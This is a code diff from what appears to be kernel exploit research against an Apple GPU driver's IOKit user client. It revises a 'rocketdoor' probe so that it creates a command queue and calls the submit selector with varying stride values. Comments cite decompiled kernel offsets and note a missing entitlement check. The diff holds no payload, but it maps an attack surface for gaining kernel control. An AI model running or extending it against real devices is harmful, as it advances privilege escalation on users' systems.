@@ -29,7 +29,7 @@
 #import <stdlib.h>
 #import <unistd.h>
 
-#define P143_BUILD @"p143-rocketdoor-v2-ownerlaw"
+#define P143_BUILD @"p143-rocketdoor-v3-lawshape"
 
 /* P069 no-header law: local prototypes only */
 typedef mach_port_t p_ioservice_t; typedef mach_port_t p_ioconnect_t;
@@ -131,35 +131,49 @@ static void p143_bandit(const char *outcome) {
                  return P143R(); }
     L(@"[2] surface armed (the live-resource law)");
 
-    /* ---- stage 3: the OWNER-LAW census (the decode-correction batch) --
-       24A435 decode: the owner = minted at OPEN time by
-       deviceUserClientStart (0xa024970; vt+0x588 blraa with the task
-       token from [uc+0xd8]) — NO userland selector writes [uc+0x120].
-       The submit fn = row 0x19 (0xa02299c; the pinned 0x24 = off by
-       11 rows, fn VA right, index wrong), kind=4, checkIn=variable,
-       out=1; NO entitlement check in the row (size/overflow asserts
-       only). [uc+0x103] = the gpu-restricted table-choice bit.
-       CENSUS: rows 0x17..0x1B + the owner-reader row 0x37 (cin=0). */
-    L(@"[3] the owner-law census on the LIVE open: submit-row 0x19 +");
-    L(@"    the neighbors + the owner-getter 0x37 (cin=0/out=scalar).");
+    /* ---- stage 3: the LAW-SHAPED first door test (agent-2's laws) --
+       The census's shape flaw is fixed: rows get THEIR OWN input
+       shapes. row0 = s_new_command_queue (scIn=0, no struct, 64B
+       structOUT) -> our qid. row0x19 = the submit: scalars
+       {qid, count=1, stride, 0} + structIn = count*stride (the SIZE
+       law), the stride ladder per the [q+0x530]+0x260 config law.  */
+    L(@"[3] the LAW-SHAPED test: row0 (the queue create, its own shape)");
+    L(@"    -> qid; then row0x19 with the stride ladder + the size law.");
+    uint64_t ourQid = 0;
     {
-        uint64_t inB[4] = { 0, 0, 0, 0 };
-        uint64_t outB[8]; memset(outB, 0, sizeof outB);
-        uint32_t nout = 8;
-        uint64_t stB[16]; memset(stB, 0, sizeof stB);
-        size_t nsc = sizeof stB;
-        for (uint32_t s = 0x17; s <= 0x1B; s++) {
-            nout = 8; nsc = sizeof stB;
-            kern_return_t k2 = call(conn, s, inB, 4, NULL, 0, outB, &nout, stB, &nsc);
-            Lf(@"    sel 0x%x kr=0x%08x out0=0x%llx out1=0x%llx struct=%zu",
-               s, (unsigned)k2, (unsigned long long)outB[0],
-               (unsigned long long)outB[1], nsc);
+        uint8_t qob[0x40]; memset(qob, 0, sizeof qob);
+        uint32_t nout = 0;
+        size_t osc = sizeof qob;
+        kern_return_t kr = call(conn, 0, NULL, 0, NULL, 0, NULL, &nout,
+                                qob, &osc);
+        Lf(@"[3a] row0 (new_command_queue) kr=0x%08x osz=%zu", (unsigned)kr, osc);
+        if (kr == 0) {
+            for (uint32_t oi = 0; oi + 8 <= 0x40; oi += 8) {
+                uint64_t v; memcpy(&v, qob + oi, 8);
+                if (v && v <= 0xffffffffull && ourQid == 0) ourQid = v;
+                Lf(@"    out+%#x = 0x%016llx", oi, (unsigned long long)v);
+            }
+            Lf(@"[3a] the 1-based qid candidate (first u32-shaped nonzero) = %llu",
+               (unsigned long long)ourQid);
         }
-        nout = 4; nsc = sizeof stB;
-        kern_return_t k37 = call(conn, 0x37, NULL, 0, NULL, 0, outB, &nout, stB, &nsc);
-        Lf(@"    sel 0x37 (owner-reader row; [owner+0xfc] bit0's vt chain)"
-           @" kr=0x%08x out0=0x%llx struct=%zu",
-           (unsigned)k37, (unsigned long long)outB[0], nsc);
+    }
+    {
+        const uint32_t strides[4] = { 0x20, 0x28, 0x30, 0x40 };
+        for (int si = 0; si < 4; si++) {
+            if (ourQid == 0) { L(@"  no qid - the ladder skipped (honest)"); break; }
+            uint32_t stride = strides[si];
+            static uint8_t ent[0x40]; memset(ent, 0, sizeof ent);
+            uint32_t cnt = 1;
+            uint64_t inS[4] = { ourQid, cnt, stride, 0 };
+            uint64_t out[2]; memset(out, 0, sizeof out);
+            uint32_t nout = 1;
+            kern_return_t kr = call(conn, 0x19, inS, 4, ent, cnt * stride,
+                                    out, &nout, NULL, NULL);
+            Lf(@"    submit qid=%llu count=1 stride=0x%x kr=0x%08x out0=%llu"
+               @"  (0 = CLEAN, 8 = the sub-fail sentinel)",
+               (unsigned long long)ourQid, stride, (unsigned)kr,
+               (unsigned long long)out[0]);
+        }
     }
     L(@"[3] the door's real gate = the INPUT shape: kind=4 + variable");
     L(@"    struct-in (the cmdBufArgSize/total-overflow assert laws = the");
